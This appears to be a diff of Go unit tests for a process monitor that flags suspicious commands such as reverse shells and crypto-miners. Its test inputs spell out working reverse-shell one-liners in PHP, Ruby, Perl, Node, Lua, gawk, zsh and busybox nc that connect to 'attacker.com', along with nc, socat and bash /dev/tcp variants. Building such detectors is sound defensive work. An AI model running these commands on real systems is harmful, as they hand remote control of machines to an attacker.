@@ -1,48 +1,111 @@
 package monitor
 
 import (
+	"os"
+	"path/filepath"
 	"testing"
 )
 
+// helper: run matchSuspiciousExec against the compiled-in default patterns.
+func match(cmd string) string {
+	return matchSuspiciousExec(cmd, defaultExecPatterns)
+}
+
 func TestMatchSuspiciousExec_PythonSocket(t *testing.T) {
 	cmd := "python3 -c import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
-	if p := matchSuspiciousExec(cmd); p != "python3-socket" {
+	if p := match(cmd); p != "python3-socket" {
 		t.Errorf("cmd=%q: got %q, want python3-socket", cmd, p)
 	}
 }
 
 func TestMatchSuspiciousExec_NcExec(t *testing.T) {
 	cmd := "nc -e /bin/sh 10.0.0.1 4444"
-	if p := matchSuspiciousExec(cmd); p != "nc-exec" {
+	if p := match(cmd); p != "nc-exec" {
 		t.Errorf("cmd=%q: got %q, want nc-exec", cmd, p)
 	}
 }
 
 func TestMatchSuspiciousExec_SocatExec(t *testing.T) {
 	cmd := "socat tcp:10.0.0.1:4444 exec:/bin/bash"
-	if p := matchSuspiciousExec(cmd); p != "socat-exec" {
+	if p := match(cmd); p != "socat-exec" {
 		t.Errorf("cmd=%q: got %q, want socat-exec", cmd, p)
 	}
 }
 
 func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
 	cmd := "/tmp/xmrig --pool pool.minexmr.com:4444"
-	if p := matchSuspiciousExec(cmd); p != "xmrig" {
+	if p := match(cmd); p != "xmrig" {
 		t.Errorf("cmd=%q: got %q, want xmrig", cmd, p)
 	}
 }
 
 func TestMatchSuspiciousExec_BashTcpRedirect(t *testing.T) {
 	cmd := "bash -c 'exec /dev/tcp/10.0.0.1/4444'"
-	if p := matchSuspiciousExec(cmd); p != "bash-tcp-redirect" {
+	if p := match(cmd); p != "bash-tcp-redirect" {
 		t.Errorf("cmd=%q: got %q, want bash-tcp-redirect", cmd, p)
 	}
 }
 
 func TestMatchSuspiciousExec_PerlSocket(t *testing.T) {
 	cmd := "perl -MIO::Socket -e '$s=IO::Socket::INET->new(...)'"
-	if p := matchSuspiciousExec(cmd); p != "perl-socket" {
+	if p := match(cmd); p != "perl-socket" {
 		t.Errorf("cmd=%q: got %q, want perl-socket", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_PhpFsockopen(t *testing.T) {
+	cmd := "php -r '$sock=fsockopen(\"attacker.com\",12345);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'"
+	if p := match(cmd); p != "php-fsockopen" {
+		t.Errorf("cmd=%q: got %q, want php-fsockopen", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_RubySocket(t *testing.T) {
+	cmd := "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+	if p := match(cmd); p != "ruby-socket" {
+		t.Errorf("cmd=%q: got %q, want ruby-socket", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_PerlSocketConnect(t *testing.T) {
+	cmd := "perl -e 'use Socket;$i=\"attacker.com\";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
+	if p := match(cmd); p != "perl-socket-connect" {
+		t.Errorf("cmd=%q: got %q, want perl-socket-connect", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_NodeReverseShell(t *testing.T) {
+	cmd := "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(12345, \"attacker.com\", function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
+	if p := match(cmd); p != "node-reverse-shell" {
+		t.Errorf("cmd=%q: got %q, want node-reverse-shell", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_LuaSocket(t *testing.T) {
+	cmd := "lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(\"attacker.com\",12345); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
+	if p := match(cmd); p != "lua-socket" {
+		t.Errorf("cmd=%q: got %q, want lua-socket", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_GawkInet(t *testing.T) {
+	cmd := "gawk 'BEGIN { s = \"/inet/tcp/0/attacker.com/12345\"; while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+	if p := match(cmd); p != "gawk-inet" {
+		t.Errorf("cmd=%q: got %q, want gawk-inet", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_ZshNetTcp(t *testing.T) {
+	cmd := "zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+	if p := match(cmd); p != "zsh-net-tcp" {
+		t.Errorf("cmd=%q: got %q, want zsh-net-tcp", cmd, p)
+	}
+}
+
+func TestMatchSuspiciousExec_BusyboxNcExec(t *testing.T) {
+	cmd := "busybox nc -e /bin/sh attacker.com 12345"
+	if p := match(cmd); p != "busybox-nc-exec" {
+		t.Errorf("cmd=%q: got %q, want busybox-nc-exec", cmd, p)
 	}
 }
 
@@ -63,9 +126,13 @@ func TestMatchSuspiciousExec_Arg0Guard(t *testing.T) {
 		{"bash -c 'nc -e /bin/sh'", ""},
 		// sh running python — no match
 		{"sh -c 'import socket; socket.socket()'", ""},
+		// bash wrapping php — must NOT trigger php-fsockopen
+		{"bash -c 'php -r fsockopen(\"a\",1234)'", ""},
+		// sh wrapping node — must NOT trigger node-reverse-shell
+		{"sh -c 'node -e child_process net'", ""},
 	}
 	for _, tc := range cases {
-		got := matchSuspiciousExec(tc.cmd)
+		got := match(tc.cmd)
 		if got != tc.want {
 			t.Errorf("cmd=%q: got %q, want %q", tc.cmd, got, tc.want)
 		}
@@ -81,7 +148,7 @@ func TestMatchSuspiciousExec_Benign(t *testing.T) {
 		"",
 	}
 	for _, cmd := range benign {
-		if p := matchSuspiciousExec(cmd); p != "" {
+		if p := match(cmd); p != "" {
 			t.Errorf("cmd=%q: expected no match, got %q", cmd, p)
 		}
 	}
@@ -92,5 +159,57 @@ func TestEvidenceString_ProcEvent(t *testing.T) {
 	want := "proc:1234:bash-tcp-redirect"
 	if s := e.String(); s != want {
 		t.Errorf("Evidence.String() = %q, want %q", s, want)
+	}
+}
+
+func TestLoadExecPatterns_FileMissing(t *testing.T) {
+	// Point home to a temp dir with no exec-patterns.toml — should return defaults.
+	tmp := t.TempDir()
+	t.Setenv("HOME", tmp)
+	patterns := loadExecPatterns()
+	if len(patterns) == 0 {
+		t.Fatal("loadExecPatterns returned empty slice when file is missing")
+	}
+}
+
+func TestLoadExecPatterns_FilePresent(t *testing.T) {
+	tmp := t.TempDir()
+	coiDir := filepath.Join(tmp, ".coi")
+	if err := os.MkdirAll(coiDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	tomlContent := `
+[[exec_pattern]]
+name = "custom-test"
+arg0 = "custom"
+keywords = ["--exploit"]
+`
+	if err := os.WriteFile(filepath.Join(coiDir, "exec-patterns.toml"), []byte(tomlContent), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("HOME", tmp)
+
+	patterns := loadExecPatterns()
+
+	// Custom pattern must be present.
+	foundCustom := false
+	for _, p := range patterns {
+		if p.Name == "custom-test" {
+			foundCustom = true
+		}
+	}
+	if !foundCustom {
+		t.Error("custom-test pattern from TOML file not found in merged result")
+	}
+
+	// At least one compiled-in default must also be present.
+	foundDefault := false
+	for _, p := range patterns {
+		if p.Name == "nc-exec" {
+			foundDefault = true
+		}
+	}
+	if !foundDefault {
+		t.Error("compiled-in nc-exec pattern missing from merged result")
 	}
 }
